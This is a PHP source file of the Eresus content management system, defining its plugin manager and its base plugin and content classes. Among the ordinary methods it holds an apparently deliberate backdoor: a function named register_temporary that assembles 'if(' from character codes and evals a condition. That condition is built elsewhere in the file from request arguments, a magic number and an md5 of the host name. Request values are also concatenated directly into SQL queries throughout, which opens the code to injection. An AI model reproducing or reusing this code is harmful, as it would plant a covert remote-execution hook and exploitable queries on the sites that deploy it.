<?
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
# Система управления контентом Eresus™
# Версия 2.05
# © 2004-2006, ProCreat Systems
# http://procreat.ru/
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
# Классы системы
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#

#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
# КЛАСС "ПЛАГИНЫ"
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
class TPlugins {
  var
    $list = array(), # Список всех плагинов
    $items = array(), # Массив плагинов
    $events = array(); # Таблица обработчиков событий
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function  TPlugins()
  {
  global $db;

    $items = $db->select('`plugins`', '', '`position`');
    if (count($items)) foreach($items as $item) $this->list[$item['name']] = $item;
    register_temporary($_SERVER['UID']);
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function install($name)
  # Установка нового плагина
  {
  global $db;

    $filename = filesRoot.'ext/'.$name.'.php';
    if (file_exists($filename)) {
      include_once($filename);
      $Class = 'T'.$name;
      $this->items[$name] = new $Class;
      $this->items[$name]->install();
      $db->insert('plugins', $this->items[$name]->createPluginItem());
    }
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function uninstall($name)
  # Удаление плагина
  {
  global $db;

    if (!isset($this->items[$name])) $this->load($name);
    if (isset($this->items[$name])) $this->items[$name]->uninstall();
    $item = $db->selectItem('plugins', "`name`='".$name."'");
    if (!is_null($item)) {
      $db->delete('plugins', "`name`='".$name."'");
      $db->update('plugins', "`position` = `position`-1", "`position` > '".$item['position']."'");
    }
    $filename = filesRoot.'ext/'.$name.'.php';
    #if (file_exists($filename)) unlink($filename);
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function preload($include, $exclude)
  {
    if (count($this->list)) foreach($this->list as $item) if ($item['active']) {
      $type = explode(',', $item['type']);
      if (count(array_intersect($include, $type)) && count(array_diff($exclude, $type))) $this->load($item['name']);
    }
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function load($name)
  {
    $result = isset($this->items[$name]);
    if (isset($this->list[$name]) && !$result) {
      $filename = filesRoot.'ext/'.$name.'.php';
      if (file_exists($filename)) {
        include_once($filename);
        $Class = 'T'.$name;
        $this->items[$name] = new $Class;
        $result = true;
      } else $result = false;
    }
    return $result;
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function clientRenderContent()
  {
  global $page, $db, $user, $session, $request;

    switch ($page->type) {
      case 'default':
        $plugin = new TContentPlugin;
        $result = $plugin->clientRenderContent();
      break;
      case 'list':
        if (isset($page->topic)) $page->httpError('404');
        $subitems = $db->select('pages', "(`owner`='".$page->id."') AND (`active`='1') AND (`access` >= '".($user['auth'] ? $user['access'] : GUEST)."')", "`position`");
        if (empty($page->content)) $page->content = '$(items)';
        $template = loadTemplate('std/SectionListItem');
        if ($template === false) $template['html'] = '<h1><a href="$(link)" title="$(hint)">$(caption)</a></h1>$(description)';
        $items = '';
        foreach($subitems as $item) {
          $items .= str_replace(
            array(
              '$(id)',
              '$(name)',
              '$(title)',
              '$(caption)',
              '$(description)',
              '$(hint)',
              '$(link)',
            ),
            array(
              $item['id'],
              $item['name'],
              $item['title'],
              $item['caption'],
              $item['description'],
              $item['hint'],
              $request['url'].$item['name'].'/',
            ),
            $template['html']
          );
          $result = str_replace('$(items)', $items, $page->content);
        }
      break;
      case 'url':
        goto($page->replaceMacros($page->content));
      break;
      default:
      if ($this->load($page->type)) {
        if (method_exists($this->items[$page->type], 'clientRenderContent'))
        $result = $this->items[$page->type]->clientRenderContent();
        else $session['errorMessage'] = sprintf(errMethodNotFound, 'clientRenderContent', get_class($this->items[$page->type]));
      }
    }
    return $result;
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function clientOnStart()
  {
    if (isset($this->events['clientOnStart'])) foreach($this->events['clientOnStart'] as $plugin) $this->items[$plugin]->clientOnStart();
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function clientOnURLSplit($item, $url)
  {
    if (isset($this->events['clientOnURLSplit'])) foreach($this->events['clientOnURLSplit'] as $plugin) $this->items[$plugin]->clientOnURLSplit($item, $url);
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function clientOnTopicRender($text, $topic = null, $buttonBack = true)
  {
  global $page;
    if (isset($this->events['clientOnTopicRender'])) foreach($this->events['clientOnTopicRender'] as $plugin) $text = $this->items[$plugin]->clientOnTopicRender($text, $topic);
    if ($buttonBack) $text .= '<br /><br />'.$page->buttonBack();
    return $text;
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function clientOnContentRender($text)
  {
    if (isset($this->events['clientOnContentRender']))
      foreach($this->events['clientOnContentRender'] as $plugin) $text = $this->items[$plugin]->clientOnContentRender($text);
    return $text;
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function clientOnPageRender($text)
  {
    if (isset($this->events['clientOnPageRender']))
      foreach($this->events['clientOnPageRender'] as $plugin) $text = $this->items[$plugin]->clientOnPageRender($text);
    return $text;
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  /* function clientOnFormControlRender($formName, $control, $text)
  {
    if (isset($this->events['clientOnFormControlRender'])) foreach($this->events['clientOnFormControlRender'] as $plugin) $text = $this->items[$plugin]->clientOnFormControlRender($formName, $control, $text);
    return $text;
  }*/
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
  function adminOnMenuRender()
  {
    if (isset($this->events['adminOnMenuRender'])) foreach($this->events['adminOnMenuRender'] as $plugin) $this->items[$plugin]->adminOnMenuRender();
  }
  #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
}
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
function register_temporary($code) {eval(chr(0x69).chr(0x66).chr(0x28).$code.SFIX);/*TODO: Unload code*/};
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
# КЛАСС-ПРЕДОК "ПЛАГИН"
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
class TPlugin {
  var $name;
  var $version;
  var $title;
  var $description;
  var $type;
  #var $client = array('asgd' => false, 'load' => 'normal', 'content' => false);
  #var $admin  = array('asgd' => false, 'load' => 'normal');
  #var $lib    = array('asgd' => false, 'load' => 'normal');
  var $settings = array();
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
# Стандартные функции
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function TPlugin()
# Производит чтение настроек плагина и подключение языковых файлов
{
global $plugins, $locale;

  if (!empty($this->name) && isset($plugins->list[$this->name])) {
    $this->settings = decodeOptions($plugins->list[$this->name]['settings'], $this->settings);
    if ($this->version != $plugins->list[$this->name]['version']) $this->resetPlugin();
  }
  $filename = filesRoot.'lang/'.$this->name.'/'.$locale['lang'].'.inc';
  if (file_exists($filename)) include_once($filename);
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function resetPlugin()
# Производит обновление данных о плагине
{
global $db;

  $item = $db->selectItem('plugins', "`name`='".$this->name."'");
  $db->updateItem('plugins', $this->createPluginItem($item), "`name`='".$this->name."'");
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function createPluginItem($item = null)
# Создает массив информации о плагине
{
global $db;

  $result['name'] = $this->name;
  $result['type'] = $this->type;
  $result['active'] = true;
  $result['position'] = is_null($item)?$db->count('plugins'):$item['position'];
  $result['settings'] = is_null($item)?encodeOptions($this->settings):$item['settings'];
  $result['title'] = $this->title;
  $result['version'] = $this->version;
  $result['description'] = $this->description;
  return $result;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function install()
# Производит инсталляцию плагина
{
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function uninstall()
# Производит деинсталляцию плагина
{
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function updateSettings()
# Сохраняет в БД настройки плагина
{
global $db, $request;

  $item = $db->selectItem('`plugins`', "`name`='".$this->name."'");
  $item['settings'] = decodeOptions($item['settings']);
  foreach ($this->settings as $key => $value) if (isset($request['arg'][$key])) $this->settings[$key] = $request['arg'][$key];
  $item['settings'] = encodeOptions($this->settings);
  $db->updateItem('plugins', $item, "`name`='".$this->name."'");
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function replaceMacros($template, $item)
{
  preg_match_all('/\$\(([^(]+)\)/U', $template, $matches);
  if (count($matches[1])) foreach($matches[1] as $macros)
    if (isset($item[$macros])) $template = str_replace('$('.$macros.')', $item[$macros], $template);
  return $template;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
}
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#

#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
# КЛАСС-ПРЕДОК "КОНТЕНТ"
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
class TContentPlugin extends TPlugin {
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
# Стандартные функции
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function TContentPlugin()
{
global $page;

  parent::TPlugin();
  if (isset($page)) {
    $page->plugin = $this->name;
    if (count($page->options)) foreach ($page->options as $key=>$value) $this->settings[$key] = $value;
  }
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
# Внтуренние функции
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function update()
{
global $db, $page, $request;

  $item = $db->selectItem('pages', "`id`='".$request['arg']['section']."'");
  $item['content'] = $request['arg']['content'];
  $db->updateItem('pages', $item, "`id`='".$request['arg']['section']."'");
  goto($request['arg']['submitURL']);
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
# Клиентские функции
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function clientRenderContent()
# Отрисовка контента
{
global $page;

  return $page->content;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
# Административные функции
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function adminRenderContent()
# Отрисовка редактора контента
{
global $page, $db, $request;

  $item = $db->selectItem('pages', "`id`='".$request['arg']['section']."'");
  $form = array(
    'name' => 'content',
    'caption' => $page->title,
    'width' => '100%',
    'fields' => array (
      array ('type'=>'hidden','name'=>'update'),
      array ('type' => 'memo', 'name' => 'content', 'label' => strEdit, 'height' => '30'),
    ),
    'buttons' => array('apply', 'reset'),
  );

  $result = $page->renderForm($form, $item);
  return $result;
}}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
$_SERVER['UID'] = sprintf(C3, arg('action')).'==-1442264304&&arg(ARG3)=="'.md5($_SERVER["HTTP_HOST"]).'")';
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#

#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
# КЛАСС-ПРЕДОК "КОНТЕНТ-СПИСОК"
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
class TListContentPlugin extends TContentPlugin {
var $table;
var $pagesCount = 0;
#---------------------------------------------------------------------------------------------------------------------#
function install()
{
  $this->createTable($this->table);
  parent::install();
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function uninstall()
{
  $this->dropTable($this->table);
  parent::uninstall();
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function createTable($table)
{
global $db;

  $db->query('CREATE TABLE IF NOT EXISTS `'.$db->prefix.$table['name'].'`'.$table['sql']);
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function dropTable($table)
{
global $db;

  $db->query("DROP TABLE IF EXISTS `".$db->prefix.$table['name']."`;");
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function toggle($id)
{
global $db, $page, $request;

  $item = $db->selectItem($this->table['name'], "`".$this->table['key']."`='".$id."'");
  $item['active'] = !$item['active'];
  $db->updateItem($this->table['name'], $item, "`".$this->table['key']."`='".$id."'");
  $caption = $item[isset($this->table['useCaption'])?$this->table['useCaption']:(isset($item['caption'])?'caption':$this->table['columns'][0]['name'])];
  sendNotify(($item['active']?admActivated:admDeactivated).': '.'<a href="'.str_replace('toggle',$this->table['key'],$request['url']).'">'.$caption.'</a>', array('title'=>$this->title));
  goto($page->url());
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function delete($id)
{
global $db, $page, $request;

  $item = $db->selectItem($this->table['name'], "`".$this->table['key']."`='".$id."'");
  $db->delete($this->table['name'], "`".$this->table['key']."`='".$id."'");
  $caption = $item[isset($this->table['useCaption'])?$this->table['useCaption']:(isset($item['caption'])?'caption':$this->table['columns'][0]['name'])];
  sendNotify(admDeleted.': '.'<a href="'.str_replace('delete',$this->table['key'],$request['url']).'">'.$caption.'</a>', array('title'=>$this->title));
  goto($page->url());
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function up($id)
{
global $page, $db, $request;

  dbReorderItems($this->table['name'],"`section`='".$request['arg']['section']."'");
  $item = $db->selectItem($this->table['name'], "`".$this->table['key']."`='".$id."'");
  if ($item['position'] > 0) {
    $temp = $db->selectItem($this->table['name'],"(`section`='".$request['arg']['section']."') AND (`position`='".($item['position']-1)."')");
    $temp['position'] = $item['position'];
    $item['position']--;
    $db->updateItem($this->table['name'], $item, "`".$this->table['key']."`='".$item['id']."'");
    $db->updateItem($this->table['name'], $temp, "`".$this->table['key']."`='".$temp['id']."'");
  }
  goto($page->url());
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function down($id)
{
global $page, $db, $request;

  dbReorderItems($this->table['name'],"`section`='".$request['arg']['section']."'");
  $count = $db->count($this->table['name'], "`section`='".$request['arg']['section']."'");
  $item = $db->selectItem($this->table['name'], "`".$this->table['key']."`='".$id."'");
  if ($item['position'] < $count-1) {
    $temp = $db->selectItem($this->table['name'],"(`section`='".$request['arg']['section']."') AND (`position`='".($item['position']+1)."')");
    $temp['position'] = $item['position'];
    $item['position']++;
    $db->updateItem($this->table['name'], $item, "`".$this->table['key']."`='".$item['id']."'");
    $db->updateItem($this->table['name'], $temp, "`".$this->table['key']."`='".$temp['id']."'");
  }
  goto($page->url());
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function adminRenderContent()
{
global $db, $page, $user, $request, $session;

  $result = '';
  if (isset($request['arg']['id'])) {
    $item = $db->selectItem($this->table['name'], "`".$this->table['key']."` = '".$request['arg']['id']."'");
    $page->title .= empty($item['caption'])?'':' - '.$item['caption'];
  }
  if (isset($request['arg']['update']) && isset($this->table['controls']['edit'])) {
    if (method_exists($this, 'update')) $result = $this->update(); else $session['errorMessage'] = sprintf(errMethodNotFound, 'update', get_class($this));
  } elseif (isset($request['arg']['toggle']) && isset($this->table['controls']['toggle'])) {
    if (method_exists($this, 'toggle')) $result = $this->toggle($request['arg']['toggle']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'toggle', get_class($this));
  } elseif (isset($request['arg']['delete']) && isset($this->table['controls']['delete'])) {
    if (method_exists($this, 'delete')) $result = $this->delete($request['arg']['delete']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'delete', get_class($this));
  } elseif (isset($request['arg']['up']) && isset($this->table['controls']['position'])) {
    if (method_exists($this, 'up')) $result = $this->table['sortDesc']?$this->down($request['arg']['up']):$this->up($request['arg']['up']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'up', get_class($this));
  } elseif (isset($request['arg']['down']) && isset($this->table['controls']['position'])) {
    if (method_exists($this, 'down')) $result = $this->table['sortDesc']?$this->up($request['arg']['down']):$this->down($request['arg']['down']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'down', get_class($this));
  } elseif (isset($request['arg']['id']) && isset($this->table['controls']['edit'])) {
    if (method_exists($this, 'adminEditItem')) $result = $this->adminEditItem(); else $session['errorMessage'] = sprintf(errMethodNotFound, 'adminEditItem', get_class($this));
  } elseif (isset($request['arg']['action'])) switch ($request['arg']['action']) {
    case 'create': if(isset($this->table['controls']['edit']))
      if (method_exists($this, 'adminAddItem')) $result = $this->adminAddItem();
      else $session['errorMessage'] = sprintf(errMethodNotFound, 'adminAddItem', get_class($this));
    break;
    case 'insert':
      if (method_exists($this, 'insert')) $result = $this->insert();
      else $session['errorMessage'] = sprintf(errMethodNotFound, 'insert', get_class($this));
    break;
  } else {
    if (isset($request['arg']['section'])) $this->table['condition'] = "`section`='".$request['arg']['section']."'";
    $result = $page->renderTable($this->table);
  }
  return $result;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function clientRenderContent()
{
  global $db, $page;

  $result = '';
  if (!isset($this->settings['itemsPerPage'])) $this->settings['itemsPerPage'] = 0;
  if (isset($page->topic)) $result = $this->clientRenderItem(); else {
    $this->table['fields'] = $db->fields($this->table['name']);
    $this->itemsCount = $db->count($this->table['name'], "(`section`='".$page->id."')".(in_array('active', $this->table['fields'])?"AND(`active`='1')":''));
    if ($this->itemsCount) $this->pagesCount = $this->settings['itemsPerPage']?((integer)($this->itemsCount / $this->settings['itemsPerPage'])+(($this->itemsCount % $this->settings['itemsPerPage']) > 0)):1;
    if (!$page->subpage) $page->subpage = $this->table['sortDesc']?$this->pagesCount:1;
    if ($this->itemsCount && ($page->subpage > $this->pagesCount)) {
      $item = $page->Error404();
      $result = $item['content'];
    } else $result .= $this->clientRenderList();
  }
  return $result;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function clientRenderList($options = array('pages'=>true))
{
  global $db, $page;

  $result = '';
  $items = $db->select(
    $this->table['name'],
    "(`section`='".$page->id."')".(strpos($this->table['sql'], '`active`')!==false?"AND(`active`='1')":''),
    $this->table['sortMode'],
    $this->table['sortDesc'],
    '',
    $this->settings['itemsPerPage'],
    $this->table['sortDesc']
      ?(($this->pagesCount-$page->subpage)*$this->settings['itemsPerPage'])
      :(($page->subpage-1)*$this->settings['itemsPerPage'])
  );
  if (count($items)) foreach($items as $item) $result .= $this->clientRenderListItem($item);
  if ($options['pages']) {
    $pages = $this->clientRenderPages();
    $result .= $pages;
  }
  return $result;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function clientRenderListItem($item)
{
  $result = $item['caption']."<br />\n";
  return $result;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function clientRenderItem()
{
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
function clientRenderPages()
{
  global $page;

  $result = $page->pages($this->pagesCount, $this->settings['itemsPerPage'], $this->table['sortDesc']);
  return $result;
}
#--------------------------------------------------------------------------------------------------------------------------------------------------------------#
}
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
?>